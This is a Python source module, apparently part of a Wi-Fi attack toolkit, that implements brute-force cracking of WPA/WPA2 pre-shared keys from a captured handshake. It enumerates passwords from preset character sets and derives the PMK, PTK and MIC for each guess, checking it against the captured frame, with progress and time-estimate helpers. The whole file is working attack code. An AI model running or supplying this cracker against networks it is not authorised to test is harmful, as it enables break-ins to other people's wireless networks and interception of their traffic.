"""Brute-force WPA cracking attack.

Systematically tries all character combinations of a given length
range.  Supports configurable character sets and early termination.
"""

import itertools
import string
import time
from typing import Callable, Dict, Generator, List, Optional, Tuple

from wifi_aio.exceptions import CrackingError, WiFiTimeoutError


# ── Character set presets ──────────────────────────────────────────────

CHARSET_LOWERCASE = string.ascii_lowercase
CHARSET_UPPERCASE = string.ascii_uppercase
CHARSET_DIGITS = string.digits
CHARSET_HEX = string.hexdigits[:16]  # 0-9 a-f
CHARSET_ALPHA = string.ascii_letters
CHARSET_ALPHANUMERIC = string.ascii_letters + string.digits
CHARSET_PRINTABLE = string.printable.strip()  # excludes whitespace
CHARSET_SYMBOLS = "!@#$%^&*()-_=+[]{}|;:',.<>?/~`"

PRESETS = {
    "lowercase": CHARSET_LOWERCASE,
    "uppercase": CHARSET_UPPERCASE,
    "digits": CHARSET_DIGITS,
    "hex": CHARSET_HEX,
    "alpha": CHARSET_ALPHA,
    "alphanumeric": CHARSET_ALPHANUMERIC,
    "printable": CHARSET_PRINTABLE,
    "symbols": CHARSET_SYMBOLS,
}


class BruteForceAttack:
    """Systematic brute-force WPA/WPA2 PSK cracking.

    Generates all possible password combinations from a character set
    and length range, testing each against the captured handshake.

    Parameters
    ----------
    handshake:
        A dict with keys ``ssid``, ``anonce``, ``snonce``, ``ap_mac``,
        ``client_mac``, ``mic``, ``eapol_frame``.
    charset:
        Character set to use – either a preset name or a custom string.
    min_length:
        Minimum password length (minimum 8 for WPA).
    max_length:
        Maximum password length (maximum 63 for WPA).
    """

    def __init__(
        self,
        handshake: Dict,
        charset: str = "alphanumeric",
        min_length: int = 8,
        max_length: int = 12,
    ) -> None:
        self.handshake = handshake
        self.min_length = max(8, min_length)  # WPA minimum
        self.max_length = min(63, max_length)  # WPA maximum

        # Resolve character set
        if charset in PRESETS:
            self.charset = PRESETS[charset]
        else:
            self.charset = charset

        self._found: Optional[str] = None
        self._tested = 0
        self._start_time: Optional[float] = None
        self._running = False
        self._callback: Optional[Callable[[int, Optional[str]], None]] = None

        # Pre-parse handshake fields
        self._ssid_bytes = handshake.get("ssid", "").encode("utf-8")
        self._anonce = bytes.fromhex(handshake.get("anonce", "")) if isinstance(handshake.get("anonce"), str) else handshake.get("anonce", b"")
        self._snonce = bytes.fromhex(handshake.get("snonce", "")) if isinstance(handshake.get("snonce"), str) else handshake.get("snonce", b"")
        self._ap_mac = bytes.fromhex(handshake.get("ap_mac", "").replace(":", "")) if isinstance(handshake.get("ap_mac"), str) else handshake.get("ap_mac", b"")
        self._client_mac = bytes.fromhex(handshake.get("client_mac", "").replace(":", "")) if isinstance(handshake.get("client_mac"), str) else handshake.get("client_mac", b"")
        self._target_mic = bytes.fromhex(handshake.get("mic", "")) if isinstance(handshake.get("mic"), str) else handshake.get("mic", b"")
        self._eapol_frame = bytes.fromhex(handshake.get("eapol_frame", "")) if isinstance(handshake.get("eapol_frame"), str) else handshake.get("eapol_frame", b"")

    # ── Public API ─────────────────────────────────────────────────────

    def run(
        self,
        callback: Optional[Callable[[int, Optional[str]], None]] = None,
        timeout: Optional[float] = None,
    ) -> Optional[str]:
        """Run the brute-force attack.

        Parameters
        ----------
        callback:
            Called periodically with ``(tested_count, password_or_none)``.
        timeout:
            Maximum seconds to run.

        Returns
        -------
        str or None
            The cracked password, or ``None`` if not found.
        """
        self._callback = callback
        self._found = None
        self._tested = 0
        self._running = True
        self._start_time = time.time()

        deadline = None if timeout is None else time.monotonic() + timeout

        try:
            for length in range(self.min_length, self.max_length + 1):
                if not self._running:
                    break

                for combo in itertools.product(self.charset, repeat=length):
                    if not self._running:
                        break
                    if deadline is not None and time.monotonic() >= deadline:
                        break

                    password = "".join(combo)
                    if self._check_password(password):
                        self._found = password
                        if self._callback:
                            self._callback(self._tested, password)
                        return password

                    self._tested += 1
                    if self._callback and self._tested % 1000 == 0:
                        self._callback(self._tested, None)

        finally:
            self._running = False

        return None

    def stop(self) -> None:
        """Stop a running attack."""
        self._running = False

    def estimate_total(self) -> int:
        """Estimate the total number of combinations to test."""
        total = 0
        for length in range(self.min_length, self.max_length + 1):
            total += len(self.charset) ** length
        return total

    def estimate_time(self, speed: float = 100.0) -> float:
        """Estimate time in seconds at the given *speed* (passwords/sec)."""
        total = self.estimate_total()
        return total / speed if speed > 0 else float("inf")

    def generate_passwords(self, length: int) -> Generator[str, None, None]:
        """Yield all passwords of a given *length* without testing."""
        for combo in itertools.product(self.charset, repeat=length):
            yield "".join(combo)

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def tested(self) -> int:
        return self._tested

    @property
    def elapsed(self) -> float:
        if self._start_time is None:
            return 0.0
        return time.time() - self._start_time

    @property
    def speed(self) -> float:
        e = self.elapsed
        return self._tested / e if e > 0 else 0.0

    @property
    def found_password(self) -> Optional[str]:
        return self._found

    @property
    def progress(self) -> float:
        """Progress as a fraction (0.0–1.0)."""
        total = self.estimate_total()
        return self._tested / total if total > 0 else 0.0

    # ── Password verification ──────────────────────────────────────────

    def _check_password(self, password: str) -> bool:
        """Check a single password against the handshake."""
        import hashlib
        import hmac as hmac_mod

        if not self._anonce or not self._snonce:
            return False
        if not self._ap_mac or not self._client_mac:
            return False
        if not self._target_mic or not self._eapol_frame:
            return False

        # Derive PMK
        pmk = hashlib.pbkdf2_hmac(
            "sha1", password.encode("utf-8"), self._ssid_bytes, 4096, dklen=32
        )

        # Derive PTK
        ap_mac = self._ap_mac
        client_mac = self._client_mac
        if ap_mac < client_mac:
            mac_min, mac_max = ap_mac, client_mac
        else:
            mac_min, mac_max = client_mac, ap_mac

        anonce = self._anonce
        snonce = self._snonce
        if anonce < snonce:
            nonce_min, nonce_max = anonce, snonce
        else:
            nonce_min, nonce_max = snonce, anonce

        a = b"Pairwise key expansion"
        b = mac_min + mac_max + nonce_min + nonce_max

        ptk = b""
        for i in range(4):
            ptk += hmac_mod.new(pmk, a + b"\x00" + b + bytes([i]), hashlib.sha1).digest()
        ptk = ptk[:64]

        # Compute MIC
        frame_copy = bytearray(self._eapol_frame)
        if len(frame_copy) >= 97:
            frame_copy[81:97] = b"\x00" * 16
        computed_mic = hmac_mod.new(ptk[:16], bytes(frame_copy), hashlib.sha1).digest()[:16]

        return hmac_mod.compare_digest(computed_mic, self._target_mic)

    # ── String representation ──────────────────────────────────────────

    def __repr__(self) -> str:
        return (
            f"BruteForceAttack(charset={len(self.charset)} chars, "
            f"len={self.min_length}-{self.max_length}, "
            f"combinations={self.estimate_total():.2e})"
        )
